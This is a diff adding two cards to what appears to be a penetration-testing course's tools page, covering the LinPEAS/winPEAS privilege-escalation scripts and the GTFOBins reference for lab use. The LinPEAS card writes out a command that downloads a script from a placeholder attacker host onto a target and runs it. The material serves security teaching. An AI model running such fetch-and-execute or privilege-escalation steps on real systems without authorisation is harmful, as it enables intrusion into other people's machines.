@@ -488,6 +488,62 @@
           <span>CLI · enumeration</span>
         </div>
       </article>
+
+      <!-- PEASS (LinPEAS / winPEAS) -->
+      <article class="tool-setup-card" id="peass">
+        <div class="tool-setup-card__header">
+          <div class="tool-setup-card__title-group">
+            <span class="tool-setup-card__icon">🧨</span>
+            <h2 class="tool-setup-card__title">LinPEAS / winPEAS</h2>
+          </div>
+          <span class="comparison-badge" style="color:var(--color-danger);border-color:rgba(255,51,102,0.3);">PRIVESC ENUMERATION</span>
+        </div>
+        <p class="tool-setup-card__desc">Post-exploitation enumeration scripts that run every privilege-escalation check at once and highlight findings in red. <code>LinPEAS</code> for Linux, <code>winPEAS</code> for Windows. Learn the manual checks (<code>sudo -l</code>, SUID, cron) first so you understand what it flags.</p>
+        <div class="tool-setup-steps">
+          <div class="tool-setup-step">
+            <span class="tool-setup-step-label">Get it (from your box to the target)</span>
+            <code>wget &lt;your-host&gt;/linpeas.sh -O /tmp/linpeas.sh</code>
+          </div>
+          <div class="tool-setup-step">
+            <span class="tool-setup-step-label">Run it</span>
+            <code>chmod +x /tmp/linpeas.sh && /tmp/linpeas.sh</code>
+          </div>
+          <div class="tool-setup-step">
+            <span class="tool-setup-step-label">Source</span>
+            <a class="target-launcher__url" href="https://github.com/peass-ng/PEASS-ng" target="_blank" rel="noopener noreferrer">github.com/peass-ng/PEASS-ng</a>
+          </div>
+        </div>
+        <div class="tool-setup-card__footer">
+          <span>Active in: <a href="./labs/lab09.html" class="badge-lab-ref">Lab 09</a></span>
+          <span>Script · post-exploitation</span>
+        </div>
+      </article>
+
+      <!-- GTFOBins -->
+      <article class="tool-setup-card" id="gtfobins">
+        <div class="tool-setup-card__header">
+          <div class="tool-setup-card__title-group">
+            <span class="tool-setup-card__icon">📖</span>
+            <h2 class="tool-setup-card__title">GTFOBins</h2>
+          </div>
+          <span class="comparison-badge" style="color:var(--color-cyan);border-color:rgba(0,229,255,0.3);">REFERENCE · NO INSTALL</span>
+        </div>
+        <p class="tool-setup-card__desc">A catalog of how ordinary Unix binaries can be abused to break out of a restricted shell or escalate privileges. When <code>sudo -l</code> or a SUID hunt turns up a binary, look it up here for the exact technique.</p>
+        <div class="tool-setup-steps">
+          <div class="tool-setup-step">
+            <span class="tool-setup-step-label">Open it (bookmark it)</span>
+            <a class="target-launcher__url" href="https://gtfobins.github.io" target="_blank" rel="noopener noreferrer">gtfobins.github.io</a>
+          </div>
+          <div class="tool-setup-step">
+            <span class="tool-setup-step-label">Use it</span>
+            <code>Search the binary → read the "sudo" or "SUID" section → copy the one-liner</code>
+          </div>
+        </div>
+        <div class="tool-setup-card__footer">
+          <span>Active in: <a href="./labs/lab09.html" class="badge-lab-ref">Lab 09</a></span>
+          <span>In-browser · reference</span>
+        </div>
+      </article>
     </div>
   </main>
 
